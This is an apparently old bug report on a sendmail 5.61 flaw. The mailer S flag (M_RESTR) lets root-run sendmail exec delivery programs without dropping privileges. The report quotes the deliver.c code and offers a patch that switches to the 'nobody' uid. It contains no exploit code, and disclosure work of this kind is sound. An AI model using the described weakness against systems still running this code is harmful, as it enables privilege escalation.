Subject: sendmail and the 'S' flag
Index: usr.sbin/sendmail/deliver.c 4.3BSD-tahoe


here is a script of the security hole in sendmail 5.61. I am actually using
a version that was modified for use on suns, including the sun
yp lookup calls, but I have tested this bug on a vax running the regular
bsd version.  The documentation (Installation and Operations Guide, 
Appendix C) says that the mailer flag S doesn't set the real uid, which is
what happens - but if sendmail is run as root the programs should be
exec'd as nobody or some other "safe" uid.  M_RESTR is the S flag.
Of course this problem can be avoided by not using any aliases that
write to files.

(line 885)
		if (!bitnset(M_RESTR, m->m_flags))
		{
			if (ctladdr == NULL || ctladdr->q_uid == 0)
			{
				(void) setgid(DefGid);
				(void) setuid(DefUid);
			}
			else
			{
				(void) setgid(ctladdr->q_gid);
				(void) setuid(ctladdr->q_uid);
			}
		}
my fix is to add the else clause (where 32767 is the uid of "nobody"):

		else
		{
		    (void) setgid(32767);
		    (void) setuid(32767);
		} 

Sorry, but I don't have a context diff.  Let me know if I can help clarify
things further.

	Wayne
